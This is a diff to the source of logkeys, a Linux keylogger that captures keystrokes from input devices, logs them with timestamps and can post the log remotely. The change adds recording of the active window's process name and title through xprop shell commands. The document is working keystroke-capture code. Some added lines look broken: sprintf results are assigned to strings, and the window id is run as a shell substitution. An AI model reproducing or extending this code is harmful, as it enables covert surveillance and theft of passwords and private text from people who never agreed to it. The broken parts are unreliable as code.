@@ -48,9 +48,16 @@
 #define COMMAND_STR_DUMPKEYS ( EXE_DUMPKEYS " -n | " EXE_GREP " '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'" )
 #define COMMAND_STR_GET_PID  ( (std::string(EXE_PS " ax | " EXE_GREP " '") + program_invocation_name + "' | " EXE_GREP " -v grep").c_str() )
 
+#define COMMAND_STR_DEVICE    EXE_GREP " -E 'Handlers|EV' /proc/bus/input/devices | " EXE_GREP " -B1 120013 | " EXE_GREP " -Eo event[0-9]+"
+
+// active window id, title, name
+#define COMMAND_STR_AWID    "xprop -root 32x '\\t$0' _NET_ACTIVE_WINDOW | cut -f 2"
+
 #define INPUT_EVENT_PATH  "/dev/input/"  // standard path
 #define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
 #define PID_FILE          "/var/run/logkeys.pid"
+
+#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
 
 #include "usage.cc"      // usage() function
 #include "args.cc"       // global arguments struct and arguments parsing
@@ -68,12 +75,11 @@ std::string execute(const char* cmd)
     char buffer[128];
     std::string result = "";
     while(!feof(pipe))
-    	if(fgets(buffer, 128, pipe) != NULL)
-    		result += buffer;
+      if(fgets(buffer, 128, pipe) != NULL)
+        result += buffer;
     pclose(pipe);
     return result;
 }
-
 
 int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
 
@@ -331,9 +337,7 @@ void determine_input_device()
   
   // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
   // The compiler automatically concatenates these adjacent strings to a single string.
-  const char* cmd = EXE_GREP " -E 'Handlers|EV=' /proc/bus/input/devices | "
-    EXE_GREP " -B1 'EV=1[02]001[3Ff]' | "
-    EXE_GREP " -Eo 'event[0-9]+' ";
+  const char* cmd = COMMAND_STR_DEVICE;
   std::stringstream output(execute(cmd));
   
   std::vector<std::string> results;
@@ -367,6 +371,59 @@ void determine_input_device()
   seteuid(0); setegid(0);
 }
 
+// write newline then add timestamp and programinfo
+////event is wrong use refercen or pointer
+inline int newline(FILE *& out, struct input_event event, bool program_changed, std::string program_info) {
+  char timestamp[32];
+  int inc_size = fprintf(out, "\n");
+
+  if (!(args.flags & FLAG_NO_TIMESTAMPS)) {
+    strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&event.time.tv_sec));
+    inc_size += fprintf(out, "%s", timestamp);
+  }
+  if (program_changed)
+    inc_size += fprintf(out, "%s", program_info.c_str());
+
+  return inc_size;
+}
+
+inline int encode_char(FILE *& out, unsigned int scan_code, bool altgr_in_effect, bool shift_in_effect) {
+  int inc_size = 0;
+  if (is_char_key(scan_code)) {
+    wchar_t wch;
+    if (altgr_in_effect) {
+      wch = altgr_keys[to_char_keys_index(scan_code)];
+      if (wch == L'\0') {
+        if(shift_in_effect)
+          wch = shift_keys[to_char_keys_index(scan_code)];
+        else
+          wch = char_keys[to_char_keys_index(scan_code)];
+      }
+    } 
+    else if (shift_in_effect) {
+      wch = shift_keys[to_char_keys_index(scan_code)];
+      if (wch == L'\0')
+        wch = char_keys[to_char_keys_index(scan_code)];
+    }
+    else  // neither altgr nor shift are effective, this is a normal char
+      wch = char_keys[to_char_keys_index(scan_code)];
+    
+    if (wch != L'\0') 
+    inc_size += fprintf(out, "%lc", wch);  // write character to log file
+  }
+  else if (is_func_key(scan_code)) {
+    if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
+      inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
+    } 
+    else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
+      inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
+    }
+  }
+  else 
+    inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
+  
+  return inc_size;
+}
 
 int main(int argc, char **argv)
 {  
@@ -480,14 +537,22 @@ int main(int argc, char **argv)
   
   time_t cur_time;
   time(&cur_time);
-#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
   strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
   
   if (args.flags & FLAG_NO_TIMESTAMPS)
     file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
   else
-    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
+    file_size += fprintf(out, "Logging started ...\n\n");
+  
   fflush(out);
+
+  // programinfo
+  std::string window_id;
+  std::string old_window_id;
+  std::string process_name; 
+  std::string window_title;
+  std::string program_info;
+  bool program_changed = false;
   
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
@@ -507,7 +572,22 @@ int main(int argc, char **argv)
       if (inc_size > 0) file_size += inc_size;
       continue;
     }
-    
+
+    // on processid change, update window-title write '[process name] "window title" > '
+    if (args.flags & FLAG_WINDOW_TITLE) {
+      window_id = execute(COMMAND_STR_AWID);
+      
+      //// really ugly!
+      if (window_id.compare(old_window_id) != 0) {
+        process_name = sprintf("xprop -id $(%s) 0s '\\t$1' WM_CLASS | cut -f2-", window_id.c_str());
+        window_title = sprintf("xprop -id $(%s) _NET_WM_NAME | cut -d'=' -f2-", window_id.c_str());
+        window_title = execute(window_title.c_str());
+        process_name = execute(process_name.c_str());
+        program_info = "[" + process_name.erase(process_name.size() - 1) + "] " + window_title.erase(window_title.size() - 1) + " > "; // delete newline (why are newlines)
+        program_changed = true;
+      }
+    }
+
     // if remote posting is enabled and size treshold is reached
     if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
       fclose(out);
@@ -546,7 +626,7 @@ int main(int argc, char **argv)
         }
       }
     }
-    
+
     // on key repeat ; must check before on key press
     if (event.value == EV_REPEAT) {
       ++count_repeats;
@@ -560,63 +640,27 @@ int main(int argc, char **argv)
       }
       count_repeats = 0;  // reset count for future use
     }
-    
+
     // on key press
     if (event.value == EV_MAKE) {
-      
-      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
-      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
-          (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
-        if (ctrl_in_effect)
-          inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
-        if (args.flags & FLAG_NO_TIMESTAMPS)
-          inc_size += fprintf(out, "\n");
-        else {
-          strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
-        }
-        if (inc_size > 0) file_size += inc_size;
-        continue;  // but don't log "<Enter>"
+      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp and window-title
+      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER) {
+        inc_size += newline(out, event, program_changed, program_info);
       }
-      
-      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
-        shift_in_effect = true;
-      if (scan_code == KEY_RIGHTALT)
-        altgr_in_effect = true;
-      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-        ctrl_in_effect = true;
-      
-      // print character or string coresponding to received keycode; only print chars when not \0
-      if (is_char_key(scan_code)) {
-        wchar_t wch;
-        if (altgr_in_effect) {
-          wch = altgr_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0') {
-            if(shift_in_effect)
-              wch = shift_keys[to_char_keys_index(scan_code)];
-            else
-              wch = char_keys[to_char_keys_index(scan_code)];
-          }
-        } 
-        else if (shift_in_effect) {
-          wch = shift_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0')
-            wch = char_keys[to_char_keys_index(scan_code)];
-        }
-        else  // neither altgr nor shift are effective, this is a normal char
-          wch = char_keys[to_char_keys_index(scan_code)];
-        
-        if (wch != L'\0') inc_size += fprintf(out, "%lc", wch);  // write character to log file
+      else if (program_changed || (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
+        inc_size += newline(out, event, program_changed, program_info);
+        inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect);
       }
-      else if (is_func_key(scan_code)) {
-        if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
-          inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
-        } 
-        else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
-          inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
-        }
+      else { // normal char
+        if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
+          shift_in_effect = true;
+        if (scan_code == KEY_RIGHTALT)
+          altgr_in_effect = true;
+        if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
+          ctrl_in_effect = true;
+
+        inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect); // print character or string coresponding to received keycode; only print chars when not \0
       }
-      else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
     } // if (EV_MAKE)
     
     // on key release
@@ -628,10 +672,17 @@ int main(int argc, char **argv)
       if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
         ctrl_in_effect = false;
     }
+
+    // update program id
+    if (args.flags & FLAG_WINDOW_TITLE) { 
+      old_window_id = window_id;
+      program_changed = false;
+    }
     
     prev_code = scan_code;
     fflush(out);
-    if (inc_size > 0) file_size += inc_size;
+    if (inc_size > 0) 
+      file_size += inc_size;
     
   } // while (read(input_fd))
   
@@ -653,4 +704,3 @@ int main(int argc, char** argv)
 {
   return logkeys::main(argc, argv);
 }
-
